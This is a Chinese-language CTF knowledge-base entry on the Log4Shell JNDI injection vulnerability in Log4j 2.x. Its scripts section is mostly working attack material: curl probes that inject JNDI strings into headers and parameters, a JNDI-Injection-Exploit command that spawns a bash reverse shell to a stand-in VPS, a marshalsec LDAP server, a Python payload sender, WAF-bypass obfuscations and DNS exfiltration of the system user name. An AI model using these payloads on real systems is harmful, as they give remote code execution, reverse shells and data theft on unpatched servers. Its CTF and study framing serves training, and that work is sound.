---
title: Log4Shell CVE-2021-44228（JNDI 注入）
category: web
tags: [log4j, log4shell, jndi, cve-2021-44228, rce]
signals: [日志里出现 jndi 关键字, 用户输入被日志记录, log4j 2.x 依赖, java 应用, 用户名写进日志, 可以控制 UA, UA 被记录, ldap 回连, cve-2021-44228]
difficulty: medium
source: "NVD / Apache / 公开 PoC"
tools: [jndi-exploit-kit, marshalsec, python, java]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- Java 应用，且任何输入（用户名、UA、X-Api-Version）都会被写日志。
- 题面给出 `log4j-core-2.x.jar`（2.0-beta9 ~ 2.14.1）或 pom 里依赖 log4j。
- 服务器对你提交的 UA / 参数会发起外部 DNS 请求（用 dnslog 探测）。
- 题目提示"log4j"、"日志注入"、"CVE-2021-44228"。
- 关键词：jndi、ldap、lookup、log4j、44228。

## 二、原理

Log4j2 的 Lookup 功能支持 `${jndi:ldap://host/x}` 语法。当日志内容包含该字符串时，log4j 会执行 JNDI lookup 去 `host` 拉取对象并反序列化 → RCE。

经典 payload：
```
${jndi:ldap://ATTACKER/Exploit}
```
变体（绕过 WAF）：
```
${${lower:j}ndi:...}
${jndi:ldap://ATTACKER/${java:version}}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://...}
```

2.15.0 修复为默认禁用 JNDI，2.17.0 修了后续绕过。

## 三、解题步骤

1. 用 dnslog 探测：提交 `${jndi:ldap://xxx.dnslog.cn/a}` 到所有可控输入（参数、header、formula）。
2. 有回连 → 起恶意 LDAP/RMI 服务（JNDI-Injection-Exploit / marshalsec）。
3. 用 base64 编码命令，生成 payload URL。
4. 提交 payload，恶意服务器下发 gadget 触发 RCE。
5. 出网受限时改用回连 HTTP 拿数据 / 写文件。

## 四、可直接运行的脚本

探测（DNS 出网）：

```bash
# 1) 快速探测所有可能入口
TARGET="http://TARGET"
D="xxx.dnslog.cn"

curl -s "$TARGET" -H "User-Agent: \${jndi:ldap://$D/ua}" -o /dev/null
curl -s "$TARGET/?q=\${jndi:ldap://$D/q}" -o /dev/null
curl -s "$TARGET" -H "X-Api-Version: \${jndi:ldap://$D/api}" -o /dev/null
curl -s "$TARGET" -H "Referer: \${jndi:ldap://$D/ref}" -o /dev/null
```

起恶意 JNDI 服务并生成 payload：

```bash
# 方案 A：JNDI-Injection-Exploit（最省事，RMI/LDAP/HTTP 全给）
git clone https://github.com/welk1n/JNDI-Injection-Exploit
cd JNDI-Injection-Exploit && mvn clean package -DskipTests
java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -C "bash -i >& /dev/tcp/VPS/4444 0>&1" -A VPS
# 输出若干 payload，形如：
#   ldap://VPS:1389/xxxxx
#   rmi://VPS:1099/xxxxx

# 方案 B：marshalsec（LDAP 回连到恶意 class）
java -cp marshalsec-0.0.3-all.jar marshalsec.jndi.LDAPRefServer \
  "http://VPS:8000/#Exploit" 1389
```

发送：

```python
import requests

TARGET = "http://TARGET"
JNDI = "ldap://VPS:1389/xxxxx"      # 由上面工具生成

payload = "${jndi:%s}" % JNDI
# 简单变形（WAF 场景）
obf = "${${lower:j}ndi:${lower:l}dap://VPS:1389/xxxxx}"

for name, where in [("UA", {"User-Agent": payload}),
                    ("Q",  None)]:
    if where:
        requests.get(TARGET, headers=where)
    else:
        requests.get(TARGET, params={"username": payload})
```

常用 WAF 绕过变形：

```text
${jndi:ldap://VPS:1389/a}
${${lower:j}ndi:${lower:l}dap://VPS:1389/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://VPS:1389/a}
${${env:BARFOO:-j}ndi:${env:BARFOO:-l}dap://VPS:1389/a}
${jndi:${sys:java.version}}  -> 仅回连，不 RCE（探测用）
${jndi:dns://VPS/abc}        -> 纯 DNS 回连
```

## 五、常见坑 / 变体

- **JDK 版本决定利用方式**：8u191+ 禁用了远程 codebase，需 LDAP 本地工厂（`javax.naming.spi` + Tomcat BeanFactory）或 RMI + `ysoserial` gadget。
- **${} 被框架吃掉**：某些模板/前端会转义 `${`，需 URL 编码 `%24%7Bjndi:`。
- **出网限制**：只能 DNS 出网时，用 DNS 带数据出（`${jndi:dns://xxx.${sys:user.name}.dnslog.cn}`）。
- **2.15.0 也会被绕过**：${jndi:ldap://host/a|b} 的形式，实际 CTF 里直接看版本。
- 变体：**CVE-2021-45046**（2.15.0 绕过）、**CVE-2021-45105**（DoS）。
- 变体：**CTF 变体**通常是"伪 log4j"：题目自己实现了 `${}` 替换 + `Runtime.exec`，直接 `cat /flag`。
- 变体：**用 base64 编码命令**避免 shell 特殊字符：`bash -c {echo,BASE64}|{base64,-d}|bash`。

## 六、参考来源

- [NVD - CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j 安全公告](https://logging.apache.org/log4j/2.x/security.html)
- [JNDI-Injection-Exploit（PoC 工具）](https://github.com/welk1n/JNDI-Injection-Exploit)
- [PayloadsAllTheThings - Log4Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [Apache Log4j2 Lookups 文档](https://logging.apache.org/log4j/2.x/manual/lookups.html)
- [CISA KEV - CVE-2021-44228](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
